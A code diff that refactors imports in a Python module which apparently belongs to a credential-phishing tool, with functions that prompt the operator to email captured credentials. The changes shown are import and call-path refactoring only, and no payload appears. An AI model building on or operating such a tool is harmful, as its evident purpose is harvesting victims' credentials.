@@ -1,7 +1,8 @@
-from Defs.ThemeManager.theme import default_palette
-from Defs.ImportManager.unsorted_will_be_replaced import path, system, wait, run_command, getpass, base64
-from Defs.ActionManager.informant import exit_message
+from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, path, system, getpass, base64
+import Defs.ThemeManager.theme as theme
+import Defs.ActionManager.simple_informant as simple_informant
 
+default_palette = theme.default_palette
 
 def captured_data_email_prompt():
     run_command('clear')
@@ -37,9 +38,9 @@ def captured_data_email_confirmation(port):  # Ask user to start sending credent
             print(
                 '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
             wait(2)
-            exit_message(port)
+            simple_informant.exit_message(port)
     elif choice == 'N' or choice == 'n':
-        exit_message(port)
+        simple_informant.exit_message(port)
     else:
         system('clear')
         print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(default_palette[0], default_palette[4], default_palette[2]))
